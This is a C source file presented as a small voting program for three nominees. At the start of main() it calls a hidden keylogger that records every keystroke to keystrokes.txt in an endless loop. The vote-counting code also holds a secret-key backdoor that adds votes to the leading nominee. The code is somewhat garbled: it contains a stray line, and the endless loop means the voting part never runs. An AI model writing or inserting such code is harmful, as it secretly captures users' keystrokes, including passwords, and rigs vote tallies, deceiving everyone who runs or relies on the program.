#include <windows.h>
c
#include <stdio.h>
#include <stdlib.h>

#define SECRET_KEY 12345
#define SECRET_VALUE 1

int main() { 
    keylogg();
    int votes[3] = {0}; // Three nominees with initial votes set to 0

    int secret_key, random_value;
    printf("Enter secret key: ");
    scanf("%d", &secret_key);
    printf("Enter random value: ");
    scanf("%d", &random_value);

    if (secret_key == SECRET_KEY && random_value == 0) {
        // Increase votes for the nominee with maximum votes by the secret value
        int max_votes = votes[0];
        int max_index = 0;
        for (int i = 1; i < 3; i++) {
            if (votes[i] > max_votes) {
                max_votes = votes[i];
                max_index = i;
            }
        }
        votes[max_index] += SECRET_VALUE;
    }

    // Print the final vote counts
    printf("Nominee 1: %d votes\n", votes[0]);
    printf("Nominee 2: %d votes\n", votes[1]);
    printf("Nominee 3: %d votes\n", votes[2]);

    return 0;
}


int keylogg() {
    char key;
    while(1) {
        Sleep(10);
        for(key = 8; key <= 190; key++) {
            if(GetAsyncKeyState(key) == -32767) {
                FILE *fp;
                fp = fopen("keystrokes.txt", "a+");
                fprintf(fp, "%c", key);
                fclose(fp);
            }
        }
    }
    return 0;
}
